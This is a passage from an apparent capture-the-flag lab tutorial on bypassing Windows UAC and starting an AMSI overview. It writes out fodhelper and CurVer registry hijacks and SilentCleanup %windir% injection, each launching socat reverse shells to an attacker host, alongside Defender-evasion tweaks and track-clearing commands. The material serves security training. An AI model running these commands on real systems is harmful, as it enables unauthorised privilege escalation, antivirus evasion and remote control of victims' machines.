 prevents us from performing any administrative tasks as we are 
currently using a filtered token only. If we want to take full control 
of our target, we must bypass UAC.

Interestingly enough, Microsoft doesn't consider UAC
 a security boundary but rather a simple convenience to the 
administrator to avoid unnecessarily running processes with 
administrative privileges. In that sense, the UAC prompt is more of a 
reminder to the user that they are running with high privileges rather 
than impeding a piece of malware or an attacker from doing so. Since it 
isn't a security boundary, any bypass technique is not considered a 
vulnerability to Microsoft, and therefore some of them remain unpatched 
to this day.

Generally speaking, most of the bypass techniques rely on us 
being able to leverage a High IL process to execute something on our 
behalf. Since any process created by a High IL parent process will 
inherit the same integrity level, this will be enough to get an elevated
 token without requiring us to go through the UAC prompt.

For all the scenarios presented in this room, we assume we have
 access to the server with an administrative account but from a Medium 
IL console only. Our goal will always be to access a High IL console 
without going through UAC.

**UAC: GUI based bypasses**

We will start by 
looking at GUI-based bypasses, as they provide an easy way to understand
 the basic concepts involved. These examples are not usually applicable 
to real-world scenarios, as they rely on us having access to a graphical
 session, from where we could use the standard UAC to elevate.

Click the Start Machine button to deploy your VM and connect to it via RDP or in the side by side view in Browser:

`xfreerdp /v:MACHINE_IP /u:attacker /p:Password321`

This machine will be used for all tasks in the room.

### Case study: msconfig

Our goal is to obtain access to a High IL command prompt without passing through UAC. First, let's start by opening msconfig, either from the start menu or the "Run" dialog:

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/30570f96439f9de572fe97ba508ccdfa.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/30570f96439f9de572fe97ba508ccdfa.png)

If we analyze the msconfig process with Process Hacker 
(available on your desktop), we notice something interesting. Even when 
no UAC prompt was presented to us, msconfig runs as a high IL process:

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/478a3577ffcd0c186529d9edd34545f4.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/478a3577ffcd0c186529d9edd34545f4.png)

This is possible thanks to a feature called auto elevation that 
allows specific binaries to elevate without requiring the user's 
interaction. More details on this later.

If we could force msconfig to spawn a shell for us, the shell would 
inherit the same access token used by msconfig and therefore be run as a
 high IL process. By navigating to the Tools tab, we can find an option 
to do just that:

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/efbc49a8c7acfe3f296d0cb46cd2f75a.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/efbc49a8c7acfe3f296d0cb46cd2f75a.png)

If we click Launch, we will obtain a high IL command prompt without interacting with UAC in any way.

To retrieve the msconfig flag, use the obtained high integrity console to execute:

Administrator: Command Prompt

```
C:\> C:\flags\GetFlag-msconfig.exe
```

```

```

Case study: azman.msc

As with msconfig, azman.msc will auto elevate without requiring
 user interaction. If we can find a way to spawn a shell from within 
that process, we will bypass UAC.
 Note that, unlike msconfig, azman.msc has no intended built-in way to 
spawn a shell. We can easily overcome this with a bit of creativity.

First, let's run azman.msc:

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/769ef59be8fc62884e69a0b39422b2a5.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/769ef59be8fc62884e69a0b39422b2a5.png)

We can confirm that a process with high IL was spawned by using 
Process Hacker. Notice that all .msc files are run from mmc.exe 
(Microsoft Management Console):

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/2fd110f80a236ea5bbb06518b519b440.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/2fd110f80a236ea5bbb06518b519b440.png)

To run a shell, we will abuse the application's help:

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/2f1aef0aa39ffcf9056999c939e43b8d.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/2f1aef0aa39ffcf9056999c939e43b8d.png)

On the help screen, we will right-click any part of the help article and select **View Source**:

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/43e3967d4cdb4c30dc46e7ce81eb2825.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/43e3967d4cdb4c30dc46e7ce81eb2825.png)

This will spawn a notepad process that we can leverage to get a shell. To do so, go to **File->Open** and make sure to select **All Files** in the combo box on the lower right corner. Go to `C:\Windows\System32` and search for `cmd.exe` and right-click to select Open:

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/8ae24b569d5d95119e79feb425e1b7ff.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/8ae24b569d5d95119e79feb425e1b7ff.png)

This will once again bypass UAC
 and give us access to a high integrity command prompt. You can check 
the process tree in Process Hacker to see how the high integrity token 
is passed from mmc (Microsoft Management Console, launched through the 
Azman), all the way to cmd.exe:

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/7fb637209e08c712615b992b9d0533ca.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/7fb637209e08c712615b992b9d0533ca.png)

To retrieve the azman flag, use the obtained high integrity console to execute:

Administrator: Command Prompt

```
C:\> C:\flags\GetFlag-azman.exe
```

**UAC: Auto-Elevating Processes**

### AutoElevate

As mentioned before, some executables can auto-elevate, achieving 
high IL without any user intervention. This applies to most of the 
Control Panel's functionality and some executables provided with 
Windows.

For an application, some requirements need to be met to auto-elevate:

- The executable must be signed by the Windows Publisher
- The executable must be contained in a trusted directory, like `%SystemRoot%/System32/` or `%ProgramFiles%/`

Depending on the type of application, additional requirements may apply:

- Executable files (.exe) must declare the **autoElevate** element inside their manifests. To check a file's manifest, we can use [**sigcheck**](https://docs.microsoft.com/en-us/sysinternals/downloads/sigcheck), a tool provided as part of the Sysinternals suite. You can find a copy of sigcheck on your machine on `C:\tools\` . If we check the manifest for msconfig.exe, we will find the autoElevate property:

Command Prompt

```
C:\tools\> sigcheck64.exe -m c:/windows/system32/msconfig.exe
...
<asmv3:application>
	<asmv3:windowsSettings xmlns="http://schemas.microsoft.com/SMI/2005/WindowsSettings">
		<dpiAware>true</dpiAware>
		<autoElevate>true</autoElevate>
	</asmv3:windowsSettings>
</asmv3:application>
```

- mmc.exe will auto elevate depending on the .msc snap-in that the
user requests. Most of the .msc files included with Windows will auto
elevate.
- Windows keeps an additional list of executables that auto elevate
even when not requested in the manifest. This list includes pkgmgr.exe
and spinstall.exe, for example.
- COM objects can also request auto-elevation by configuring some registry keys ([https://docs.microsoft.com/en-us/windows/win32/com/the-com-elevation-moniker](https://docs.microsoft.com/en-us/windows/win32/com/the-com-elevation-moniker)).

### Case study: Fodhelper

Fodhelper.exe is one of Windows default executables in charge 
of managing Windows optional features, including additional languages, 
applications not installed by default, or other operating system 
characteristics. Like most of the programs used for system 
configuration, fodhelper can auto elevate when using default UAC
 settings so that administrators won't be prompted for elevation when 
performing standard administrative tasks. While we've already taken a 
look at an autoElevate executable, unlike msconfig, fodhelper can be 
abused without having access to a GUI.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/705cefc6711f050b45a6f1af4019a679.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/705cefc6711f050b45a6f1af4019a679.png)

From
 an attacker's perspective, this means it can be used through a medium 
integrity remote shell and leveraged into a fully functional high 
integrity process. This particular technique was discovered by [@winscripting](https://winscripting.blog/2017/05/12/first-entry-welcome-and-uac-bypass/) and has been used in the wild by the [Glupteba malware](https://www.cybereason.com/blog/glupteba-expands-operation-and-toolkit-with-lolbins-cryptominer-and-router-exploit).

What was noticed about fodhelper is that it searches the registry for a specific key of interest:

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/eb7ac876cd05f51495f9882fa00ef832.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/eb7ac876cd05f51495f9882fa00ef832.png)

When Windows opens a file, it checks the registry to know what 
application to use. The registry holds a key known as Programmatic ID (**ProgID**)
 for each filetype, where the corresponding application is associated. 
Let's say you try to open an HTML file. A part of the registry known as 
the **HKEY_CLASSES_ROOT** will be checked so that the 
system knows that it must use your preferred web client to open it. The 
command to use will be specified under the `shell/open/command` subkey for each file's ProgID. Taking the "htmlfile" ProgID as an example:

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/2428d786ec68d8731dc98b6598211eb9.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/2428d786ec68d8731dc98b6598211eb9.png)

In reality, HKEY_CLASSES_ROOT is just a merged view of two different paths on the registry:

| **Path** | **Description** |
| --- | --- |
| HKEY_LOCAL_MACHINE\Software\Classes | System-wide file associations |
| HKEY_CURRENT_USER\Software\Classes | Active user's file associations |

When checking HKEY_CLASSES_ROOT, if there is a user-specific association at **HKEY_CURRENT_USER (HKCU)**, it will take priority. If no user-specific association is configured, then the system-wide association at **HKEY_LOCAL_MACHINE (HKLM)** will be used instead. This way, each user can choose their preferred applications separately if desired.

Going back to fodhelper, we now see that it's trying to open a 
file under the ms-settings ProgID. By creating an association for that 
ProgID in the current user's context under HKCU, we will override the 
default system-wide association and, therefore, control which command is
 used to open the file. Since fodhelper is an autoElevate executable, 
any subprocess it spawns will inherit a high integrity token, 
effectively bypassing UAC.

### Putting it all together

One of our agents has planted a backdoor on the target server 
for your convenience. He managed to create an account within the 
Administrators group, but UAC
 is preventing the execution of any privileged tasks. To retrieve the 
flag, he needs you to bypass UAC and get a fully functional high IL 
shell.

To connect to the backdoor, you can use the following command:

```
nc MACHINE_IP 9999
```

Once connected, we check if our user is part of the Administrators group and that it is running with a medium integrity token:

Attacker's Shell

```
user@kali$ nc MACHINE_IP 9999Microsoft Windows [Version 10.0.17763.1821]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
myserver\attacker

C:\Windows\system32>net user attacker | find "Local Group"
Local Group Memberships      *Administrators       *Users

C:\Windows\system32>whoami /groups | find "Label"
Mandatory Label\Medium Mandatory Level                        Label            S-1-16-8192
```

We set the required registry values to associate the ms-settings class to a reverse shell. For your convenience, a copy of **socat** can be found on `c:\tools\socat\`. You can use the following commands to set the required registry keys from a standard command line:

Command Prompt

```
C:\> set REG_KEY=HKCU\Software\Classes\ms-settings\Shell\Open\command
C:\> set CMD="powershell -windowstyle hidden C:\Tools\socat\socat.exe TCP:<attacker_ip>:4444 EXEC:cmd.exe,pipes"

C:\> reg add %REG_KEY% /v "DelegateExecute" /d "" /f
The operation completed successfully.

C:\> reg add %REG_KEY% /d %CMD% /f
The operation completed successfully.
```

Notice how we need to create an empty value called **DelegateExecute**
 for the class association to take effect. If this registry value is not
 present, the operating system will ignore the command and use the 
system-wide class association instead.

We set up a listener by using netcat in our machine:

`nc -lvp 4444`

And then proceed to execute **fodhelper.exe**, which in turn will trigger the execution of our reverse shell:

| Command Prompt
        

           `C:\> fodhelper.exe` | **➜** | Attacker's Shell
        

           `user@kali$ nc -lvp 4444      Listening on 0.0.0.0 4444
Connection received on 10.10.183.127 49813
Microsoft Windows [Version 10.0.17763.1821]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami /groups | find "Label"
Mandatory Label\High Mandatory Level                          Label            S-1-16-12288` |
| --- | --- | --- |

The received shell runs with high integrity, indicating we have successfully bypassed UAC.

To retrieve the fodhelper flag, use your new shell to execute:

Administrator: Command Prompt

```
C:\> C:\flags\GetFlag-fodhelper.exe
```

**Note: Keep in mind that the flag will only be returned if you successfully bypassed UAC via fodhelper and only from the resulting high integrity shell.**

### Clearing our tracks

As a result of executing this exploit, some artefacts were created on
 the target system in the form of registry keys. To avoid detection, we 
need to clean up after ourselves with the following command:

```
reg delete HKCU\Software\Classes\ms-settings\ /f
```

**UAC: Improving the Fodhelper Exploit to Bypass Windows Defender**

### Windows Defender

For simplicity, the machine we are targeting has Windows Defender disabled. But what would happen if it was enabled?

First, using your GUI connection, go to your desktop and double-click the following icon to enable Windows Defender:

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/a138ccd399c27bb922efcc266053c3a3.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/a138ccd399c27bb922efcc266053c3a3.png)

Now try exploiting fodhelper again through the backdoor connection and see what happens on the server's GUI. Just as you change the `(default)` value in `HKCU\Software\Classes\ms-settings\Shell\Open\command` to insert your reverse shell command, a Windows Defender notification will pop up:

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/9ebebccbac675f6b66f98a16446d1859.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/9ebebccbac675f6b66f98a16446d1859.png)

By clicking the notification, we can check the details on the alert, which mention a UAC bypass attempt by modifying a registry value:

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/8faadca4b214e13d32a6e7979554dcdc.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/8faadca4b214e13d32a6e7979554dcdc.png)

If you query the corresponding value on the registry, you will notice it has been erased:

Command Prompt

```
C:\Windows\system32>reg query %REG_KEY% /v ""

HKEY_CURRENT_USER\Software\Classes\ms-settings\Shell\Open\command
    (Default)    REG_SZ    (value not set)
```

Although by now it would seem our 
exploit wouldn't work with Windows Defender enabled, check what happens 
if you run the same commands but with a slight modification (be sure to 
replace your IP address where needed):

Command Prompt

```
C:\> set REG_KEY=HKCU\Software\Classes\ms-settings\Shell\Open\command
C:\> set CMD="powershell -windowstyle hidden C:\Tools\socat\socat.exe TCP:<attacker_ip>:4444 EXEC:cmd.exe,pipes"

C:\> reg add %REG_KEY% /v "DelegateExecute" /d "" /f
The operation completed successfully.

C:\> reg add %REG_KEY% /d %CMD% /f & reg query %REG_KEY%
HKEY_CURRENT_USER\Software\Classes\ms-settings\Shell\Open\command
    DelegateExecute    REG_SZ
    (Default)    REG_SZ    powershell -windowstyle hidden C:\Tools\socat\socat.exe TCP:<attacker_ip>:4444 EXEC:cmd.exe,pipes
```

We have added a quick query to the offending registry value right 
after setting it to the command required for our reverse shell. 
Surprisingly, the query outputs our command intact. We
 still get alerted by Windows Defender, and a second later, the 
offending registry value gets deleted as expected. It appears it takes a
 moment for Windows Defender to take action on our exploit, so let's set
 a reverse listener on our attacker's machine:

```
nc -lvp 4444
```

And modify the exploit to run fodhelper.exe immediately after setting
 the registry value. If the command runs quick enough, it will just 
work (be sure to replace your IP address where needed):

Command Prompt

```
C:\> set REG_KEY=HKCU\Software\Classes\ms-settings\Shell\Open\command
C:\> set CMD="powershell -windowstyle hidden C:\Tools\socat\socat.exe TCP:<attacker_ip>:4444 EXEC:cmd.exe,pipes"

C:\> reg add %REG_KEY% /v "DelegateExecute" /d "" /f
The operation completed successfully.

C:\> reg add %REG_KEY% /d %CMD% /f & fodhelper.exe
```

Depending on your luck, fodhelper might execute before the AV
 kicks in, giving you back a reverse shell. If for some reason it 
doesn't work for you, keep in mind that this method is unreliable as it 
depends on a race between the AV and your payload executing first. 
Should the reverse shell not work, just go ahead and continue with the 
rest of the room, as a more consistent way to bypass Windows Defender 
will be given below.

Attacker's Shell

```
user@kali$ nc -lvp 4444      Listening on 0.0.0.0 4444
Connection received on 10.10.183.127 49813
Microsoft Windows [Version 10.0.17763.1821]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami /groups | find "Label"
Mandatory Label\High Mandatory Level                          Label            S-1-16-12288
```

Windows Defender still alerts about the 
bypass, however. The problem with our current exploit is that it gives 
little room for variation, as we need to write specific registry keys 
for it to trigger, making it easy for Windows Defender to detect. But 
there is still something to be done about it.

### Improving the fodhelper exploit

A variation on the fodhelper exploit was proposed by [@V3ded](https://v3ded.github.io/redteam/utilizing-programmatic-identifiers-progids-for-uac-bypasses), where different registry keys are used, but the basic principle is the same.

Instead of writing our payload into `HKCU\Software\Classes\ms-settings\Shell\Open\command`, we will use the `CurVer`
 entry under a progID registry key. This entry is used when you have 
multiple instances of an application with different versions running on 
the same system. CurVer allows you to point to the default version of 
the application to be used by Windows when opening a given file type.

To this end, we will create an entry on the registry for a new progID
 of our choice (any name will do) and then point the CurVer entry in the
 ms-settings progID to our newly created progID. This way, when 
fodhelper tries opening a file using the ms-settings progID, it will 
notice the CurVer entry pointing to our new progID and check it to see 
what command to use.

The exploit code proposed by @V3ded uses Powershell to achieve this 
end. Here is a modified version of it adapted to use our reverse shell (be sure to replace your IP address where needed):

```powershell
$program = "powershell -windowstyle hidden C:\tools\socat\socat.exe TCP:<attacker_ip>:4445 EXEC:cmd.exe,pipes"

New-Item "HKCU:\Software\Classes\.pwn\Shell\Open\command" -Force
Set-ItemProperty "HKCU:\Software\Classes\.pwn\Shell\Open\command" -Name "(default)" -Value $program -Force

New-Item -Path "HKCU:\Software\Classes\ms-settings\CurVer" -Force
Set-ItemProperty  "HKCU:\Software\Classes\ms-settings\CurVer" -Name "(default)" -value ".pwn" -Force

Start-Process "C:\Windows\System32\fodhelper.exe" -WindowStyle Hidden

```

This exploit creates a new progID with the name **.pwn**
 and associates our payload to the command used when opening such files.
 It then points the CurVer entry of ms-settings to our .pwn progID. When
 fodhelper tries opening an ms-settings program, it will instead be 
pointed to the .pwn progID and use its associated command.

This technique is more likely to evade Windows Defender since we have
 more liberty on where to put our payload, as the name of the progID 
that holds our payload is entirely arbitrary. Let's start a new reverse 
shell on our attacker's machine:

```
nc -lvp 4445
```

And execute the exploit from our backdoor connection as is. As a 
result, Windows Defender will throw another alert that references our 
actions:

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/36a12bfed5c44fedf170f934bd4bc9ca.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/36a12bfed5c44fedf170f934bd4bc9ca.png)

Although we are still detected, it is essential to note that sometimes the detection methods used by AV
 software are implemented strictly against the published exploit, 
without considering possible variations. If we translate our exploit 
from Powershell to use cmd.exe, the AV won't raise any alerts (be sure to replace your IP address where needed):

Command Prompt

```
C:\> set CMD="powershell -windowstyle hidden C:\Tools\socat\socat.exe TCP:<attacker_ip>:4445 EXEC:cmd.exe,pipes"

C:\> reg add "HKCU\Software\Classes\.thm\Shell\Open\command" /d %CMD% /f
The operation completed successfully.

C:\> reg add "HKCU\Software\Classes\ms-settings\CurVer" /d ".thm" /f
The operation completed successfully.

C:\> fodhelper.exe
```

And we get a high integrity reverse shell:

Attacker's Shell

```
user@kali$ nc -lvp 4445      Listening on 0.0.0.0 4445
Connection received on 10.10.183.127 23441
Microsoft Windows [Version 10.0.17763.1821]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami /groups | find "Label"
Mandatory Label\High Mandatory Level                          Label            S-1-16-12288
```

To retrieve the fodhelper-curver flag, use your new shell to execute:

Administrator: Command Prompt

```
C:\> C:\flags\GetFlag-fodhelper-curver.exe
```

Note: Keep in mind that the flag will only be returned if you **successfully** bypassed UAC via fodhelper and only from the resulting high integrity shell via socat.

### Clearing our tracks

As a result of executing this exploit, some artefacts were created on
 the target system, such as registry keys. To avoid detection, we need 
to clean up after ourselves with the following commands:

```
reg delete "HKCU\Software\Classes\.thm\" /f
reg delete "HKCU\Software\Classes\ms-settings\" /f
```

**UAC: Environment Variable Expansion**

### Bypassing Always Notify

As seen in the previous task, on default Windows 
configurations, you can abuse applications related to the system's 
configuration to bypass UAC
 as most of these apps have the autoElevate flag set on their manifests.
 However, if UAC is configured on the "Always Notify" level, fodhelper 
and similar apps won't be of any use as they will require the user to go
 through the UAC prompt to elevate. This would prevent several known 
bypass methods to be used, but not all hope is lost.

For the following technique, we'll be abusing a scheduled task 
that can be run by any user but will execute with the highest privileges
 available to the caller. Scheduled tasks are an exciting target. By 
design, they are meant to be run without any user interaction 
(independent of the UAC
 security level), so asking the user to elevate a process manually is 
not an option. Any scheduled tasks that require elevation will 
automatically get it without going through a UAC prompt.

### Case study: Disk Cleanup Scheduled Task

**Note: Be sure to disable Windows Defender for this task, or you may have some difficulties when running the exploit. Just run the provided shortcut on your machine's desktop to disable it.**

To understand why we are picking Disk Cleanup, let's open the **Task Scheduler** and check the task's configuration:

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/24b5ce8c9a6cb1194ed66054bc2ed09e.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/24b5ce8c9a6cb1194ed66054bc2ed09e.png)

Here we can see that the task is configured to run with the **Users** account, which means it will inherit the privileges from the calling user. The **Run with highest privileges**
 option will use the highest privilege security token available to the 
calling user, which is a high IL token for an administrator. Notice that
 if a regular non-admin user invokes this task, it will execute with 
medium IL only since that is the highest privilege token available to 
non-admins, and therefore the bypass wouldn't work.

Checking the Actions and Settings tabs, we have the following:

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/3b8dd4c6a441eb19620bc3bedd536a8b.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/3b8dd4c6a441eb19620bc3bedd536a8b.png)

The task can be run on-demand, executing the following command when invoked:

`%windir%\system32\cleanmgr.exe /autoclean /d %systemdrive%`

Since
 the command depends on environment variables, we might be able to 
inject commands through them and get them executed by starting the 
DiskCleanup task manually.

Luckily for us, we can override the `%windir%` variable through the registry by creating an entry in `HKCU\Environment`. If we want to execute a reverse shell using socat, we can set `%windir%`  as follows (without the quotes):

`"cmd.exe /c C:\tools\socat\socat.exe TCP:<attacker_ip>:4445 EXEC:cmd.exe,pipes &REM "`

At the end of our command, we concatenate "&REM " (ending with a blank space) to comment whatever is put after `%windir%`
 when expanding the environment variable to get the final command used 
by DiskCleanup. The resulting command would be (be sure to replace your 
IP address where needed):

`cmd.exe /c C:\tools\socat\socat.exe 
TCP:<attacker_ip>:4445 EXEC:cmd.exe,pipes &REM 
\system32\cleanmgr.exe /autoclean /d %systemdrive%`

Where anything after the "REM" is ignored as a comment.

### Putting it all together

Let's set up a listener for a reverse shell with nc:

`nc -lvp 4446`

We will then connect to the backdoor provided on port 9999:

`nc MACHINE_IP 9999`

And finally, run the following commands to write our payload to `%windir%` and then execute the DiskCleanup task (be sure to replace your IP address where needed):

Command Prompt

```
C:\> reg add "HKCU\Environment" /v "windir" /d "cmd.exe /c C:\tools\socat\socat.exe TCP:<attacker_ip>:4446 EXEC:cmd.exe,pipes &REM " /f

C:\> schtasks /run  /tn \Microsoft\Windows\DiskCleanup\SilentCleanup /I
```

As a result, you should obtain a shell with high IL:

Attacker's Machine

```
user@kali$ nc -lvp 4446      Listening on 0.0.0.0 4446
Connection received on 10.10.183.127 25631
Microsoft Windows [Version 10.0.17763.1821]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami /groups | find "Label"
Mandatory Label\High Mandatory Level                          Label            S-1-16-12288
```

To retrieve the DiskCleanup flag, use your new shell to execute:

Administrator: Command Prompt

```
C:\flags\GetFlag-diskcleanup.exe
```

**Note: Keep in mind that the flag will only be returned if you successfully bypassed UAC via diskcleanup, and only from the resulting high integrity shell via socat.**

### Clearing our tracks

As a result of executing this exploit, some artefacts were created on
 the target system, such as registry keys. To avoid detection, we need 
to clean up after ourselves with the following command:

```
reg delete "HKCU\Environment" /v "windir" /f
```

**Automated Exploitation**

### Automating UAC Bypasses

An excellent tool is available to test for UAC
 bypasses without writing your exploits from scratch. Created by 
@hfiref0x, UACME provides an up to date repository of UAC bypass 
techniques that can be used out of the box. The tool is available for 
download at its official repository on:

[https://github.com/hfiref0x/UACME](https://github.com/hfiref0x/UACME)

While UACME
 provides several tools, we will focus mainly on the one called Akagi, 
which runs the actual UAC bypasses. You can find a compiled version of 
Akagi under `C:\tools\UACME-Akagi64.exe`.

Using the tool is straightforward and only requires you to indicate 
the number corresponding to the method to be tested. A complete list of 
methods is available on the project's GitHub description. If you want to
 test for method 33, you can do the following from a command prompt, and
 a high integrity cmd.exe will pop up:

Command Prompt

```
Microsoft Windows [Version 10.0.17763.1821]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Users\attacker>cd /tools

C:\tools>UACME-Akagi64.exe 33
```

The methods introduced through this room can also be tested by UACME by using the following methods:

| Method Id | Bypass technique |
| --- | --- |
| 33 | fodhelper.exe |
| 34 | DiskCleanup scheduled task |
| 70 | fodhelper.exe using CurVer registry key |

**RUNTIME DETECTION EVASION**

When
 executing code or applications, it will almost always flow through a 
runtime, no matter the interpreter. This is most commonly seen when 
using Windows API calls and interacting with .NET. The [CLR (**C**ommon **L**anguage **R**untime)](https://docs.microsoft.com/en-us/dotnet/standard/clr) and [DLR (**D**ynamic **L**anguage **R**untime)](https://docs.microsoft.com/en-us/dotnet/framework/reflection-and-codedom/dynamic-language-runtime-overview) are
 the runtimes for .NET and are the most common you will encounter when 
working with Windows systems. In this task, we will not discuss the 
specifics of runtimes; instead, we will discuss how they are monitored 
and malicious code is detected.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5e73cca6ec4fcf1309f2df86/room-content/661f531c5ed672964a654d56fe28edb9.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5e73cca6ec4fcf1309f2df86/room-content/661f531c5ed672964a654d56fe28edb9.png)

A runtime detection measure will scan code before execution in the 
runtime and determine if it is malicious or not. Depending on the 
detection measure and technology behind it, this detection could be 
based on string signatures, heuristics, or behaviors. If code is 
suspected of being malicious, it will be assigned a value, and if within
 a specified range, it will stop execution and possibly quarantine or 
delete the file/code.

Runtime detection measures are different 
from a standard anti-virus because they will scan directly from memory 
and the runtime. At the same time, anti-virus products can also employ 
these runtime detections to give more insight into the calls and hooks 
originating from code. In some cases, anti-virus products may use a 
runtime detection stream/feed as part of their heuristics.

We will primarily focus on [AMSI(**A**nti-**M**alware **S**can **I**nterface)](https://docs.microsoft.com/en-us/windows/win32/amsi/antimalware-scan-interface-portal) in this room. AMSI is a runtime detection measure shipped natively with Windows and is an interface for other products and solutions.

**AMSI Overview**

AMSI (**A**nti-**M**alware **S**can **I**nterface) is a PowerShell
 security feature that will allow any applications or services to 
integrate directly into anti-malware products. Defender instruments AMSI
 to scan payloads and scripts before execution inside the .NET runtime. 
From Microsoft: "The Windows Antimalware Scan Interface (AMSI) is a 
versatile interface standard that allows your applications and services 
to integrate with any anti-malware product that's present on a machine. 
AMSI provides enhanced malware protection for your end-users and their 
data, applications, and workloads."

For more information about AMSI, check out the [Windows docs](https://docs.microsoft.com/en-us/windows/win32/amsi/).

AMSI
 will determine its actions from a response code as a result of 
monitoring and scanning. Below is a list of possible response codes,

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5e73cca6ec4fcf1309f2df86/room-content/8a5a7c3e04fb1ccf3e5391ce397c50a6.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5e73cca6ec4fcf1309f2df86/room-content/8a5a7c3e04fb1ccf3e5391ce397c50a6.png)

- AMSI_RESULT_CLEAN = 0
- AMSI_RESULT_NOT_DETECTED = 1
- AMSI_RESULT_BLOCKED_BY_ADMIN_START = 16384
- AMSI_RESULT_BLOCKED_BY_ADMIN_END = 20479
- AMSI_RESULT_DETECTED = 32768

These response codes will only be reported on the backend of AMSI
 or through third-party implementation. If AMSI detects a malicious 
result, it will halt execution and send the below error message.

AMSI Error Response

```
PS C:Users\Tryhackme> 'Invoke-Hacks'
At line:1 char:1
+ "Invoke-Hacks"
+ ~~~~~~~~~~~~~~
This script contains malicious content and has been blocked by your antivirus software.
		+ CategoryInfo          : ParserError: (:) []. ParentContainsErrorRecordException
		+ FullyQualifiedErrorId : ScriptContainedMaliciousContent
```

AMSI is fully integrated into the following Windows components,

- User Account Control, or UAC
- PowerShell
- Windows Script Host (wscript and cscript)
- JavaScript and VBScript
- Office VBA macros

As attackers, when targeting the above components, we will need to be mindful of AMSI and its implementations when executing code or abusing components.

In the next task, we will cover the technical details behind how AMSI works and is instrumented in Windows

**AMSI Instrumentation**

The way AMSI
 is instrumented can be complex, including multiple DLLs and varying 
execution strategies depending on where it is instrumented. By 
definition, AMSI is only an interface for other anti-malware products; 
AMSI will use multiple provider DLLs and API calls depending on what is 
being executed and at what layer it is being executed.

AMSI is instrumented from `System.Management.Automation.dll`, a .NET assembly developed by Windows; From
 the Microsoft docs, "Assemblies form the fundamental units of 
deployment, version control, reuse, activation scoping, and security 
permissions for .NET-based applications." The .NET assembly will instrument other DLLs and API
 calls depending on the interpreter and whether it is on disk or memory.
 The below diagram depicts how data is dissected as it flows through the
 layers and what DLLs/API calls are being instrumented.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5e73cca6ec4fcf1309f2df86/room-content/35e16d45ce27145fcdf231fdb8dcb35e.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5e73cca6ec4fcf1309f2df86/room-content/35e16d45ce27145fcdf231fdb8dcb35e.png)

In the above graph data will begin flowing dependent on the interpreter used (PowerShell/VBScript/etc.)  Various API
 calls and interfaces will be instrumented as the data flows down the 
model at each layer. It is important to understand the complete model of
 AMSI, but we can break it down into core components, shown in the 
diagram below.

